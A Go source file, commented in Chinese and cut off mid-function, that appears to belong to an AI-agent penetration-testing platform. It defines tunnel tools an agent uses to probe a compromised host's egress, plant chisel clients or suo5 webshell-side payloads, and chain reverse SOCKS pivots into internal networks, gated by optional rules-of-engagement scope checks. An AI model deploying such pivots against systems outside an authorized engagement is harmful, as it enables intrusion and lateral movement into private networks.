// tunnel.go 装配多层代理隧道子系统（内网渗透期 3a,INTRANET-PIVOT-DESIGN.md
// §4.3/4.3a):tunnel.Manager（进程看护 + 健康巡检）+ 四个 host 工具
// (tunnel_probe/tunnel_deploy/tunnel_list/tunnel_teardown，默认绑 worker)。
// 隧道是长寿命受管资源：平台 server 进程、目标 client 进程、stage 投递条目全部
// 落 tunnels 台账；工具描述明确「用完 teardown，不要用裸 Bash 自起隧道进程」。
package server

import (
	"context"
	"encoding/json"
	"fmt"
	"log"
	"net"
	"net/url"
	"os"
	"path/filepath"
	"strconv"
	"strings"

	"chengjian.local/chengjian/agent"
	"chengjian.local/chengjian/capability"
	"chengjian.local/chengjian/config"
	"chengjian.local/chengjian/db"
	"chengjian.local/chengjian/guard"
	"chengjian.local/chengjian/tunnel"
	actool "github.com/Autumn-27/norma/tool"
)

// initTunnels 建隧道运行时：chisel 二进制解析（CHENGJIAN_CHISEL_PATH > data/tools/chisel)、
// 台账访问层、端口审计挂钩、平台重启孤儿行标 error（诚实，不装活）、健康巡检启动。
// 失败只记日志，不拖垮启动。
func (s *Server) initTunnels(dataDir string) {
	if s.m.pg == nil || s.sessReg == nil {
		return
	}
	chiselPath := strings.TrimSpace(os.Getenv("CHENGJIAN_CHISEL_PATH"))
	if chiselPath == "" {
		chiselPath = filepath.Join(dataDir, "tools", "chisel")
	}
	// Windows 目标用的客户端（chisel.exe）。可选：缺失时 Windows 立足点只能走
	// suo5。绝不用 Linux 的 ELF 顶替——投到 Windows 上只会秒退，日志看不出原因。
	chiselPathWin := strings.TrimSpace(os.Getenv("CHENGJIAN_CHISEL_WIN_PATH"))
	if chiselPathWin == "" {
		chiselPathWin = filepath.Join(dataDir, "tools", "chisel.exe")
	}
	suo5Path := strings.TrimSpace(os.Getenv("CHENGJIAN_SUO5_PATH"))
	if suo5Path == "" {
		suo5Path = filepath.Join(dataDir, "tools", "suo5")
	}
	suo5PayloadsDir := strings.TrimSpace(os.Getenv("CHENGJIAN_SUO5_PAYLOADS_DIR"))
	if suo5PayloadsDir == "" {
		suo5PayloadsDir = filepath.Join(dataDir, "tools", "suo5-payloads")
	}
	mgr, err := tunnel.NewManager(tunnel.Options{
		Store:             db.NewTunnelStore(s.m.pg),
		Stage:             s.stage,
		Sessions:          s.sessReg,
		ChiselPath:        chiselPath,
		ChiselPathWindows: chiselPathWin,
		Suo5Path:          suo5Path,
		Suo5PayloadsDir:   suo5PayloadsDir,
		DataDir:           dataDir,
	})
	if err != nil {
		log.Printf("[tunnel] disabled: %v", err)
		return
	}
	// 隧道 server 监听口登记进端口审计台账（受管资源原则：台账外监听才告警）。
	mgr.OnListenStart = registerManagedPort
	mgr.OnListenStop = unregisterManagedPort
	// 期 3b:隧道状态变化(新增/死亡/重拉/teardown)→ 热切换该任务 MITM 实例上游。
	mgr.OnStateChange = s.m.RefreshTaskProxy
	// 隧道生命周期事件 → 任务活动流。此前只有 log 和 tunnels.state 一列，
	// 任务活动流里看不到「什么时候建的、什么时候断的、重拉了几次、死在哪」。
	mgr.OnLifecycle = s.recordTunnelLifecycle
	// Health maintenance must recheck live grants; the server lifecycle context
	// carries no task identity and cannot itself authorize remote operations.
	mgr.AuthorizeRedeploy = s.authorizeTunnelRedeploy
	// 内网期判定注入 taskproxy：用于区分「外网阶段无隧道（正常回落公网出口）」
	// 与「内网阶段隧道断了（禁止回落，须显式告知 worker 打不了）」。
	if s.m.taskProxy != nil {
		s.m.taskProxy.SetIntranetResolver(s.taskIntranet)
	}
	s.tunnels = mgr
	mgr.MarkOrphansError(s.ctx) // 平台重启 = server 进程全灭，诚实标 error，巡检按 deploy_params 重拉
	mgr.StartHealth(s.ctx)
	log.Printf("[tunnel] 多层代理隧道子系统已就绪（端口池 %s，巡检 %v)", config.TunnelPortRange(), tunnel.HealthInterval)
}

// callbackHost 取目标回连平台用的主机地址（CHENGJIAN_CALLBACK_ADDR 的 host 部分）。
func callbackHost() (string, error) {
	addr := config.CallbackAddr()
	if addr == "" {
		return "", fmt.Errorf("未配置平台回连地址：设 CHENGJIAN_CALLBACK_ADDR=<目标可达的平台IP:端口> 后重试")
	}
	host, _, err := net.SplitHostPort(addr)
	if err != nil {
		return addr, nil //  bare host（无端口）也接受
	}
	return host, nil
}

// roeCheckHost 校验目标 host 是否在本任务 RoE 范围内（与 register_session 同一套：
// strict 拦截、warn 告警放行、fail-open)。返回告警文本与拦截错误。
func (s *Server) roeCheckHost(ctx context.Context, host string) (string, error) {
	ri := agent.RunInfoFrom(ctx)
	if ri.TaskID <= 0 || s.m.pg == nil || host == "" {
		return "", nil
	}
	mode, _, _ := s.m.pg.GetSetting(settingRoEEnforcement)
	if strings.EqualFold(strings.TrimSpace(mode), "off") {
		return "", nil
	}
	rows, err := s.m.pg.Assets().ListTaskScope(ri.TaskID)
	if err != nil {
		return "", nil // 读取失败按未登记范围处理（fail-open，与 guard 一致）
	}
	verdict := guard.NewScopeMatcher(scopeRulesFromRows(rows)).Check(host)
	if verdict != guard.ScopeOut {
		return "", nil
	}
	msg := fmt.Sprintf("RoE 授权范围检查：隧道目标 %s 不在本任务(task %d)已登记范围内。"+
		"如需放行：把目标加入任务范围(add_task_scope)，或在系统设置把 roe_enforcement 改为 warn/off。",
		host, ri.TaskID)
	if strings.EqualFold(strings.TrimSpace(mode), "strict") {
		return "", fmt.Errorf("%s", msg)
	}
	return "⚠ " + msg, nil
}

// sessionVerifyAddr 取立足点会话的 webshell host:port 作为 socks 决定性验证目标
// （目标一定能回连自己的 web 端口——这是「隧道真的通」的最硬证据）。
func (s *Server) sessionVerifyAddr(ctx context.Context, sessionID int64) string {
	if s.sessStore == nil {
		return ""
	}
	rec, err := s.sessStore.Get(ctx, sessionID)
	if err != nil || rec == nil || rec.URL == "" {
		return ""
	}
	u, err := url.Parse(rec.URL)
	if err != nil || u.Hostname() == "" {
		return ""
	}
	port := u.Port()
	if port == "" {
		if u.Scheme == "https" {
			port = "443"
		} else {
			port = "80"
		}
	}
	return net.JoinHostPort(u.Hostname(), port)
}

// --- host 工具（默认绑 worker;seed 进 tools 表，按 agent 过滤） ---

// tunnelTools 返回隧道四工具。tunnels 为 nil(DB 未就绪）时不提供。
func (s *Server) tunnelTools() []actool.CoreTool {
	if s.tunnels == nil {
		return nil
	}
	return []actool.CoreTool{
		s.tunnelProbeTool(),
		s.tunnelDeployTool(),
		s.tunnelListTool(),
		s.tunnelReachTool(),
		s.tunnelTeardownTool(),
	}
}

// tunnelProbeTool 出网探测 + 选型建议（四件套之 probe)。
func (s *Server) tunnelProbeTool() actool.CoreTool {
	return actool.Build(actool.Spec{
		Name: "tunnel_probe",
		Description: "【隧道四件套 1/4·probe】经立足点会话在目标侧实测出网能力：TCP 回连平台常用口(443/80/53)" +
			"与隧道端口池采样口（tunnel_port_range 起始终端）、HTTP 出网、DNS 递归，可选 ICMP。" +
			"探针命令按目标平台自动选（Linux 用 bash /dev/tcp，Windows 用 .NET Socket 的错误码判三态），无需指定。" +
			"TCP 探针三态：连上或 refused 拒连（RST 证明路径通，仅暂无监听）都算通；超时才算被过滤。" +
			"返回每探针证据 + 证据分档选型结论（含 suggested_adapter):" +
			"能 TCP 出→建议 tunnel_deploy adapter=chisel 反向 socks；出网全断但 webshell 可用→" +
			"建议 tunnel_deploy adapter=suo5(HTTP 隧道，不依赖出网）；只 DNS→命令通道级说明。" +
			"若 probe_ran=false（探针命令没在目标侧执行），结论是 probe_unsupported 而不是「目标不出网」——" +
			"那是探针语法/权限问题（如 PowerShell 被限制），不要据此判断出网能力。" +
			"起隧道前先跑这个，别盲建。",
		Schema: map[string]any{
			"type": "object",
			"properties": map[string]any{
				"session_id": map[string]any{"type": "integer", "description": "立足点会话 id(register_session 返回）"},
				"icmp":       map[string]any{"type": "boolean", "description": "是否追加 ICMP 探针（噪声大，默认 false)"},
			},
			"required": []any{"session_id"},
		},
		ReadOnly:    func(json.RawMessage) bool { return false },
		Permissions: sessionPerm,
		Run: func(ctx context.Context, in json.RawMessage, _ *actool.ToolContext) (actool.Result, error) {
			var a struct {
				SessionID int64 `json:"session_id"`
				ICMP      bool  `json:"icmp"`
			}
			_ = json.Unmarshal(in, &a)
			sess, err := s.lookupSession(ctx, a.SessionID, db.SessionActionTunnelProbe)
			if err != nil {
				return actool.Errorf(err.Error()), nil
			}
			host, err := callbackHost()
			if err != nil {
				return actool.Errorf(err.Error()), nil
			}
			// 探测目标 = 常用回连口 443/80/53 + 隧道端口池采样（起始终端各 1 个）:
			// 隧道实际要用的监听口必须被探测到，否则「常用口被过滤」会误判 TCP 出不去。
			addrs := tunnel.ProbeAddrs(host, config.TunnelPortRange())
			// 探针命令按目标平台选（Windows 走 PowerShell + SocketErrorCode，
			// 不看本地化的异常文本）。此前固定发 bash /dev/tcp，aspx 立足点五条
			// 全失败，却被 Conclude 判成「目标无出网」——理由完全错了。
			rep, err := tunnel.ProbeOn(ctx, sess, tunnel.PlatformForSession(sess), addrs, a.ICMP)
			if err != nil {
				return actool.Errorf("探测失败：" + err.Error()), nil
			}
			concl := tunnel.Conclude(rep)
			// 租约记账（与 exec/recon/tunnel 同款）：probe 在目标侧执行过命令，
			// 「本任务用过这个会话」的事实从此刻成立——不记这笔，任务收尾时
			// 会把 probe-only 的会话当空闲资源提前放掉。
			s.noteSessionLease(ctx, a.SessionID, "probe")
			out := map[string]any{
				"report":     rep,
				"conclusion": concl,
			}
			// 探针没跑起来时，明确把「这不是网络结论」放到顶层，避免调用方
			// 只看 conclusion.grade 就当成出网判定。
			if !rep.ProbeRan() {
				out["probe_ran"] = false
				out["note"] = "探针命令未在目标侧执行（无哨兵回显）：不要把结论当成「目标不出网」。见 conclusion.recommendation。"
			} else {
				out["probe_ran"] = true
			}
			// 把「探通的口」显式回填成下一步的入参建议：deploy 时必须用它做
			// listen_port，否则端口池高位口在只放 443/80/53 的内网必然回连失败。
			if p := rep.FirstOKPort(); p > 0 {
				out["suggested_listen_port"] = p
				out["next_step"] = fmt.Sprintf("部署隧道时传 listen_port=%d（这是本机实测能出网的口）；不传会退回端口池分配，多数受限内网会回连失败", p)
			}
			return jsonResult(out)
		},
	})
}

// tunnelDeployTool 计划+部署+决定性验证（四件套之 plan+deploy)。
func (s *Server) tunnelDeployTool() actool.CoreTool {
	return actool.Build(actool.Spec{
		Name: "tunnel_deploy",
		Description: "【隧道四件套 2/4·plan+deploy】经立足点会话部署反向隧道。两个适配器：" +
			"adapter=chisel（默认能力）：目标能 TCP 出网时用，平台起 chisel server、二进制经受管投递到目标回连；" +
			"adapter=suo5（目标无出网场景，红日3 复盘缺口）:HTTP 隧道，payload(suo5.jsp/php/aspx，按会话语言自动选）" +
			"写到 webshell 同目录，平台 suo5 CLI 经入向 HTTP 建 socks5，完全不依赖目标出网，只支持 kind=socks；" +
			"adapter=auto（默认）：先看目标平台有没有对应客户端（Windows 需 chisel.exe，没有就直接 suo5），" +
			"再跑 probe，能 TCP 出网→chisel，否则→suo5。" +
			"kind=socks 建反向 socks5（返回平台回环 socks_addr);kind=portfwd 建单端口转发（仅 chisel,target=host:port 必填）。" +
			"目标平台（Windows aspx/asp 马或 Linux php/jsp 马）由会话自动判定，不需要你指定。" +
			"流程：部署 → 隧道内决定性验证（经 socks 真实 CONNECT webshell 宿主），通才标 alive；任一失败逐层回滚。" +
			"【隧道是长寿命受管资源】用完必须 tunnel_teardown 回收；不要用裸 Bash 自己起隧道进程（无台账，会被收割）。" +
			"portfwd 的 target host 会过 RoE 任务范围校验。",
		Schema: map[string]any{
			"type": "object",
			"properties": map[string]any{
				"session_id":  map[string]any{"type": "integer", "description": "立足点会话 id"},
				"kind":        strParam("隧道类型：socks（反向 socks5) / portfwd（单端口转发，仅 chisel)，必填"),
				"target":      strParam("portfwd 必填：经隧道访问的内网目标 host:port"),
				"adapter":     strParam("适配器：auto（默认，probe 结论驱动） / chisel（目标能出网） / suo5（目标无出网，仅 socks)"),
				"listen_port": map[string]any{"type": "integer", "description": "平台侧监听口（= 目标回连口），可选但强烈建议填 tunnel_probe 返回的 suggested_port。内网常只放 443/80/53 出网，此时端口池里的高位口必然回连失败。留空则从隧道端口池分配。"},
				"via_tunnel_id": map[string]any{"type": "integer", "description": "多级隧道（可选）：经已有隧道转发本跳回连。0/省略 = 目标直连平台（单跳，常见）。" +
					"填了某条 alive socks 隧道 id 时，本跳的「平台」变成那条隧道的 socks 出口——用于目标 A 可达目标 B、但 B 无法直连平台的场景。层级上限 3。"},
				"reachable_ranges": map[string]any{"type": "array", "items": map[string]any{"type": "string"},
					"description": "（可选）声明这条隧道能到达的网段，CIDR 列表，如 [\"10.0.0.0/24\",\"172.16.5.0/24\"]。" +
						"⚠️ 这是**声明不是观测**：本地 socks 端口打开 ≠ 所有网段可达。不填 = 未声明（不等于什么都不可达）。" +
						"填了之后 planner 会按它规划跨网段动作，填错比不填更糟——只写你确实验证过或从目标路由表读到的网段。"},
				"dns_policy": map[string]any{"type": "object",
					"description": "（可选）目标侧解析策略声明，如 {\"mode\":\"target\",\"servers\":[\"10.0.0.53\"]}。" +
						"mode=target 表示内网域名要在目标侧解析（平台解析不到内网域）；mode=platform 表示用平台解析器。" +
						"不填 = 未声明。"},
				"skip_reach_check": map[string]any{"type": "boolean",
					"description": "（可选）填了 reachable_ranges 时，部署完成后平台会自动经这条隧道采样探测一次（最多 6 个地址，约 3 秒），" +
						"把「声明」变成「实测」。目标侧端口全关、或你不想产生额外连接时置 true 跳过。"},
			},
			"required": []any{"session_id", "kind"},
		},
		ReadOnly:    func(json.RawMessage) bool { return false },
		Permissions: sessionPerm,
		Run: func(ctx context.Context, in json.RawMessage, _ *actool.ToolContext) (actool.Result, error) {
			var a struct {
				SessionID       int64           `json:"session_id"`
				Kind            string          `json:"kind"`
				Target          string          `json:"target"`
				Adapter         string          `json:"adapter"`
				ListenPort      int             `json:"listen_port"`
				ViaTunnelID     int64           `json:"via_tunnel_id"`
				ReachableRanges []string        `json:"reachable_ranges"`
				DNSPolicy       json.RawMessage `json:"dns_policy"`
				SkipReachCheck  bool            `json:"skip_reach_check"`
			}
			_ = json.Unmarshal(in, &a)
			sess, err := s.lookupSession(ctx, a.SessionID, db.SessionActionTunnelDeploy)
			if err != nil {
				return actool.Errorf(err.Error()), nil
			}
			// 部署隧道的每一步都在目标侧执行命令（建目录/投递/拉起/核对）。
			// 驱动明确不支持执行时，后面必然是逐层回滚——直接在这里说清，
			// 不要让它走完投递才失败（那会在目标上留下半成品文件）。
			if ok, reason := capability.For(sess).Check(capability.OpExec); !ok {
				return actool.Errorf("capability_missing: " + reason + "。隧道部署依赖目标侧执行，换一个能执行的立足点。"), nil
			}
			cbHost, err := callbackHost()
			if err != nil {
				return actool.Errorf(err.Error()), nil
			}
			// 多级隧道：经已有隧道转发本跳回连。此时「平台」= 父隧道的 socks 出口，
			// 而不是平台自己的地址——目标 B 经目标 A 的隧道回连。
			hopDepth := 0
			if a.ViaTunnelID > 0 {
				if err := s.authorizeTunnel(ctx, a.ViaTunnelID); err != nil {
					return actool.Errorf(err.Error()), nil
				}
				parent, perr := s.tunnels.Get(ctx, a.ViaTunnelID)
				if perr != nil || parent == nil {
					return actool.Errorf(fmt.Sprintf("父隧道 #%d 不存在", a.ViaTunnelID)), nil
				}
				if parent.State != db.TunnelAlive {
					return actool.Errorf(fmt.Sprintf("父隧道 #%d 状态为 %s（需 alive 才能承载下一跳）", a.ViaTunnelID, parent.State)), nil
				}
				if parent.Kind != tunnel.KindSocks {
					return actool.Errorf(fmt.Sprintf("父隧道 #%d 是 %s 类型；只有 socks 隧道能承载下一跳", a.ViaTunnelID, parent.Kind)), nil
				}
				var pp tunnel.Plan
				if json.Unmarshal(parent.DeployParams, &pp) != nil || pp.SocksPort <= 0 {
					return actool.Errorf(fmt.Sprintf("父隧道 #%d 的部署参数缺少 socks 端口，无法承载下一跳", a.ViaTunnelID)), nil
				}
				// 下一跳的「平台地址」指向父隧道的 socks 入口（平台回环），
				// chisel client 经该 socks 连出。
				cbHost = net.JoinHostPort("127.0.0.1", strconv.Itoa(pp.SocksPort))
				hopDepth = pp.HopDepth + 1
				if verr := tunnel.ValidateHopDepth(hopDepth); verr != nil {
					return actool.Errorf(verr.Error()), nil
				}
				log.Printf("[tunnel] 多级隧道：经父隧道 #%d（socks 127.0.0.1:%d）部署第 %d 跳",
					a.ViaTunnelID, pp.SocksPort, hopDepth)
			}
			kind := strings.TrimSpace(a.Kind)
			adapter := strings.ToLower(strings.TrimSpace(a.Adapter))
			if adapter == "" {
				adapter = "auto"
			}
			switch adapter {
			case "auto", tunnel.AdapterChisel, tunnel.AdapterSuo5:
			default:
				return actool.Errorf(fmt.Sprintf("adapter 非法： %q(auto|chisel|suo5)", a.Adapter)), nil
			}
			if adapter == tunnel.AdapterSuo5 && kind != tunnel.KindSocks {
				return actool.Errorf("suo5 适配器只支持 kind=socks（无出网场景的 HTTP socks 隧道）;portfwd 请用 chisel"), nil
			}
			if adapter == "auto" {
				// probe 结论驱动：portfwd 只能 chisel;socks 现场跑 probe,
				// 能 TCP 出网→chisel，全 filtered/仅 DNS/仅 ICMP→suo5（不依赖出网）。
				//
				// 平台能力先于探针结论：Windows 目标没有对应客户端二进制时，
				// 探针结论再漂亮也建不成 chisel（投递 ELF 到 Windows 只会秒退）。
				// 所以先问「这个平台有没有可用的 chisel 客户端」，再问「出网通不通」。
				plat := tunnel.PlatformForSession(sess)
				adapter = tunnel.AdapterChisel
				if kind == tunnel.KindSocks {
					if s.tunnels.ChiselBinaryFor(plat) == "" {
						adapter = tunnel.AdapterSuo5
						log.Printf("[tunnel] auto 选型：%s 目标无可用 chisel 客户端 → adapter=suo5（HTTP 隧道，无目标侧进程）", plat)
					} else {
						rep, perr := tunnel.ProbeOn(ctx, sess, plat, tunnel.ProbeAddrs(cbHost, config.TunnelPortRange()), false)
						if perr != nil {
							return actool.Errorf("auto 选型探测失败（可显式 adapter=chisel|suo5 跳过）：" + perr.Error()), nil
						}
						if concl := tunnel.Conclude(rep); concl.Grade != tunnel.GradeTCPEgress {
							adapter = tunnel.AdapterSuo5
							log.Printf("[tunnel] auto 选型：probe 分档 %s（目标无 TCP 出网或探针不可用）→ adapter=suo5", concl.Grade)
						}
					}
				}
			}
			ri := agent.RunInfoFrom(ctx)
			plat := tunnel.PlatformForSession(sess)
			opts := &tunnel.PlanOpts{
				TaskID:       ri.TaskID,
				ViaSessionID: a.SessionID,
				CallbackHost: cbHost,
				DataDir:      s.tunnels.PlanDataDir(),
				// 目标侧执行环境形态：决定远端路径（/tmp 还是 %TEMP%）与所有
				// 目标侧命令语法（mkdir -p/chmod/setsid 还是 if not exist/无/ch）。
				Platform: string(plat),
				// probe 已实测哪些口能出网（常见内网只放 443/80/53）。钉死它，
				// 避免「探通了 443、却从 20000+ 池分配 → 目标回连失败」的黑盒故障。
				PinListenPort: a.ListenPort,
				// 多级隧道层级（0 = 单跳直连平台）。
				ParentTunnelID: a.ViaTunnelID,
				HopDepth:       hopDepth,
			}
			opts.PortMin, opts.PortMax, err = tunnel.ParsePortRange(config.TunnelPortRange())
			if err != nil {
				return actool.Errorf(err.Error()), nil
			}
			used, err := s.tunnels.OccupiedPorts(ctx)
			if err != nil {
				return actool.Errorf("端口占用汇总失败：" + err.Error()), nil
			}
			opts.UsedPorts = used
			opts.CanListen = tunnel.CanListen
			var roeWarn string
			var plan *tunnel.Plan
			if adapter == tunnel.AdapterSuo5 {
				shellURL := s.sessionShellURL(ctx, a.SessionID)
				if shellURL == "" {
					return actool.Errorf(fmt.Sprintf("取不到会话 %d 的 webshell URL(suo5 payload 要写同目录），无法部署 suo5", a.SessionID)), nil
				}
				plan, err = tunnel.PlanSuo5(&tunnel.Suo5PlanOpts{
					TaskID:       ri.TaskID,
					ViaSessionID: a.SessionID,
					ShellURL:     shellURL,
					SessionKind:  sess.Kind(),
					Platform:     string(plat),
					VerifyAddr:   s.sessionVerifyAddr(ctx, a.SessionID),
					PortMin:      opts.PortMin,
					PortMax:      opts.PortMax,
					UsedPorts:    opts.UsedPorts,
					CanListen:    opts.CanListen,
					DataDir:      opts.DataDir,
				})
			} else {
				switch kind {
				case tunnel.KindSocks:
					opts.VerifyAddr = s.sessionVerifyAddr(ctx, a.SessionID)
					plan, err = tunnel.PlanSocks(opts)
				case tunnel.KindPortfwd:
					host, portStr, perr := net.SplitHostPort(strings.TrimSpace(a.Target))
					if perr != nil || host == "" {
						return actool.Errorf("portfwd 需要 target=host:port（如 10.0.0.8:3306)"), nil
					}
					port, perr := strconv.Atoi(portStr)
					if perr != nil || port <= 0 {
						return actool.Errorf("target 端口非法： " + portStr), nil
					}
					warn, roeErr := s.roeCheckHost(ctx, host)
					if roeErr != nil {
						return actool.Errorf(roeErr.Error()), nil
					}
					roeWarn = warn
					opts.TargetHost, opts.TargetPort = host, port
					plan, err = tunnel.PlanPortfwd(opts)
				default:
					return actool.Errorf("kind 必填：socks | portfwd"), nil
				}
			}
			if err != nil {
				return actool.Errorf("计划生成失败：" + err.Error()), nil
			}
			rec, err := s.tunnels.Deploy(ctx, plan)
			if err != nil {
				// 失败也留痕：否则活动流里只有成功、没有失败，复盘时看不出
				// 「试过几次、卡在哪一层」。taskID 取 RunInfo（Deploy 失败时
				// 台账行已被回滚，拿不到 rec.TaskID）。
				riFail := agent.RunInfoFrom(ctx)
				s.appendIntranetActivity(riFail.TaskID, "tunnel_deploy",
					fmt.Sprintf("隧道部署失败（已逐层回滚）：%s", truncateForSnapshot(err.Error(), 160)),
					fmt.Sprintf("kind=%s adapter=%s via_session=%d listen_port=%d err=%s",
						kind, adapter, a.SessionID, a.ListenPort, err.Error()))
				return actool.Errorf("部署失败（已逐层回滚）：" + err.Error()), nil
			}
			// 隧道建成是内网作战的关键转折点：写进活动流（人看时序），
			// 同时 intranet 快照键会让 planner 下一轮就看见（机看现状）。
			s.noteTunnelDeployed(rec.TaskID, rec.ID, rec.Kind, rec.Adapter, plan.SocksPort, rec.ViaSessionID)
			// 会话租约（T-09 覆盖补齐）：隧道以会话为传输前提，所以「本任务正在用
			// 这个会话」不只是 exec/recon 那一刻的事——隧道活着期间一直成立。
			// 不记这一笔，另一个任务删会话时只看得到 exec/recon 的持有者，
			// 会把「正在承载某任务全部内网流量」的会话当成空闲会话删掉。
			s.noteSessionLease(ctx, rec.ViaSessionID, "tunnel")
			// 可达范围 / DNS 策略声明（T-06）：只是把「以为能到哪」记下来，不写
			// reach_verified_at——那个字段只由真实探测写入，混用会让声明看起来像观测。
			declaredRanges := len(a.ReachableRanges) > 0
			if declaredRanges || len(a.DNSPolicy) > 0 {
				rr, _ := json.Marshal(a.ReachableRanges)
				if derr := db.NewTunnelStore(s.m.pg).SetReachDeclaration(ctx, rec.ID, rr, a.DNSPolicy); derr != nil {
					s.appendIntranetActivity(rec.TaskID, "tunnel_deploy",
						fmt.Sprintf("隧道 #%d 可达范围声明写入失败：%v", rec.ID, derr), "")
					declaredRanges = false
				}
			}
			// 声明写完立刻验一次（T-06）：声明是 agent 自己写的，验一次是**同一动作
			// 的收尾**，不是新增动作。所以 agent 的工作流一个字都不用改，但同样的
			// tunnel_deploy 会多带回「实测到得了哪」——这才是「无感」。
			// 探测有界（最多 6 个地址、12s 总预算），失败不影响部署结论。
			var reachRep *reachReport
			if declaredRanges && !a.SkipReachCheck {
				reachRep = s.autoVerifyReach(ctx, rec, a.ReachableRanges)
			}
			out := map[string]any{
				"tunnel_id": rec.ID,
				"kind":      rec.Kind,
				"adapter":   rec.Adapter,
				"state":     rec.State,
				// 目标平台与该平台的能力声明：调用方据此知道「这条隧道能撑到什么
				// 程度」。Windows 的 Detach 是 unknown——建成了也要复核，不能默认
				// 它会一直在。
				"target_platform": string(plat),
				"platform_caps":   tunnel.HostOf(plat).Caps(),
				"note": "隧道为受管长寿命资源：用完 tunnel_teardown 回收；断链平台自动重拉（上限 3 次）。" +
					"auth token 只存台账 deploy_params。",
			}
			if caps := tunnel.HostOf(plat).Caps(); caps.Detach == tunnel.CapabilityUnknown {
				out["verify_hint"] = "该平台的后台常驻能力未经验证（见 platform_caps.note）：建完先用 tunnel_health 复核，" +
					"并在实际用一段流量后再确认一次；不要假定它会一直活着。"
			}
			if declaredRanges {
				out["reachable_ranges"] = a.ReachableRanges
				out["reach_declared"] = true
				out["reach_note"] = "可达范围是【声明】不是观测：本地 socks 端口打开 ≠ 所有网段可达。" +
					"要把它变成观测，就经这条 socks 实际连一次目标；在那之前 planner 按它规划动作时要允许失败。"
			}
			if reachRep != nil {
				// 实测结果与声明分字段给出：前者是「我试过」，后者是「我以为」。
				// 两者放在一起，调用方才能看出「声明了 10.0.0.0/24 但只探到 3 个通」。
				out["reach_verified_ranges"] = reachRep.VerifiedRanges
				out["reach_verified"] = map[string]any{
					"probed":      reachRep.Probed,
					"reachable":   reachRep.Reachable,
					"refused":     reachRep.Refused,
					"unreachable": reachRep.Unreachable,
					"unknown":     reachRep.Unknown,
				}
				out["reach_verified_note"] = reachRep.Note
			}
			if rec.Kind == tunnel.KindSocks {
				addr := net.JoinHostPort("127.0.0.1", strconv.Itoa(plan.SocksPort))
				out["socks_addr"] = addr
				out["socks_url"] = "socks5://" + addr // 期 3b 按任务 proxyEnv 直接消费此形式
				if rec.Adapter == tunnel.AdapterSuo5 {
					// suo5 入口带 --auth 鉴权：消费方必须带口令（台账 deploy_params 有，平台内部消费用）。
					out["socks_url"] = "socks5://" + plan.AuthUser + ":" + plan.AuthPass + "@" + addr
					out["payload_url"] = plan.PayloadURL
				}
			} else {
				out["forward_addr"] = net.JoinHostPort("127.0.0.1", strconv.Itoa(plan.LocalPort))
				out["forward_to"] = net.JoinHostPort(plan.TargetHost, strconv.Itoa(plan.TargetPort))
			}
			if roeWarn != "" {
				out["roe_warning"] = roeWarn
			}
			return jsonResult(out)
		},
	})
}

// sessionShellURL 取立足点会话的 webshell URL(suo5 payload 定位同目录用）。
func (s *Server) sessionShellURL(ctx context.Context, sessionID int64) string {
	if s.sessStore == nil {
		return ""
	}
	rec, err := s.sessStore.Get(ctx, sessionID)
	if err != nil || rec == nil {
		return ""
	}
	return strings.TrimSpace(rec.URL)
}

// routeRowFields 把一条路由的运行期统计转成 tunnel_list 的一行附加字段。
//
// **只给计数，不给 host 清单。** 这不是偷懒，是职责边界：
//
//   - tunnel_list 同时绑 worker 与 planner（见 plannerReadableIntranetTools）。
//     host 清单会被读成「可达目标白名单」——planner 可能据此不派「打这个网段」
//     的意图，worker 可能据此认定某目标打不了。那才是真正的「限定范围」，
//     比不做这个字段更糟。
//   - 这份信息**无法据以行动**：选路不归 agent 控制，它不能手动指定「这个
//     host 走那条隧道」。既然不能据此做不同的事，给出明细就只剩误读风险。
//
// 计数够回答一个真问题：「第二条隧道是不是真的在承载流量」（两个网段能不能
// 同时推进）。host 级明细留给人类界面（未来工作），不进 agent 上下文。
func routeRowFields(rv tunnel.RouteView) map[string]any {
	return map[string]any{
		"proven_host_count": len(rv.ProvenHosts),
		"tried_host_count":  rv.TriedHosts,
	}
}

// tunnelListTool 列隧道台账（四件套之 health 的可见面）。
func (s *Server) tunnelListTool() actool.CoreTool {
	return actool.Build(actool.Spec{
		Name: "tunnel_list",
		Description: "【隧道四件套 3/4】列本平台隧道台账：id/类型/状态（deploying/alive/error/stopped)/" +
			"入口端口/目标/经哪条会话/错误信息/最近探活时间。必须在任务上下文内使用，只列本任务的。" +
			"多条隧道时额外返回 proven_host_count / tried_host_count：这条隧道已经成功承载过几个目标主机。" +
			"这两个计数**只是运行期统计，不是可达范围**——没被计入的主机照样可以打（平台按目标自动选路），" +
			"不要因为某主机不在计数里就认为它打不了。",
		Schema: map[string]any{
			"type":       "object",
			"properties": map[string]any{},
		},
		ReadOnly:    func(json.RawMessage) bool { return true },
		Permissions: sessionPerm,
		Run: func(ctx context.Context, in json.RawMessage, _ *actool.ToolContext) (actool.Result, error) {
			ri := agent.RunInfoFrom(ctx)
			if ri.TaskID <= 0 {
				return actool.Errorf("tunnel_list 必须在任务上下文内使用"), nil
			}
			recs, err := s.tunnels.TaskRecords(ctx, ri.TaskID)
			if err != nil {
				return actool.Errorf("台账读取失败：" + err.Error()), nil
			}
			out := []map[string]any{}
			// 逐请求选路的现状：哪条隧道被实测证明能到哪些 host。这是「两个网段
			// 能不能同时推进」的唯一可见证据——没有它，只能看到「有两条 alive
			// 隧道」，看不出第二条是否真的在承载流量。
			routes := map[int64]tunnel.RouteView{}
			if s.m.taskProxy != nil {
				for _, rv := range s.m.taskProxy.RoutesForTask(ri.TaskID) {
					routes[rv.TunnelID] = rv
				}
			}
			for _, r := range recs {
				var p tunnel.Plan
				_ = json.Unmarshal(r.DeployParams, &p)
				row := map[string]any{
					"tunnel_id":      r.ID,
					"kind":           r.Kind,
					"adapter":        r.Adapter,
					"state":          r.State,
					"listen_port":    r.ListenPort,
					"via_session_id": r.ViaSessionID,
					"last_check":     r.LastCheck.Format("2006-01-02 15:04:05"),
				}
				if rv, ok := routes[r.ID]; ok {
					for k, v := range routeRowFields(rv) {
						row[k] = v
					}
				}
				if r.Kind == tunnel.KindSocks && p.SocksPort > 0 {
					row["socks_addr"] = net.JoinHostPort("127.0.0.1", strconv.Itoa(p.SocksPort))
				}
				if r.Kind == tunnel.KindPortfwd {
					row["forward_addr"] = net.JoinHostPort("127.0.0.1", strconv.Itoa(p.LocalPort))
					row["target"] = net.JoinHostPort(r.TargetHost, strconv.Itoa(r.TargetPort))
				}
				if p.Platform != "" {
					row["target_platform"] = p.Platform
				}
				// 可达范围声明（T-06）：只有声明过的隧道才出现这两个键，
				// 避免「未声明」被读成「空 = 什么都到不了」。
				if len(r.ReachableRanges) > 0 && string(r.ReachableRanges) != "[]" {
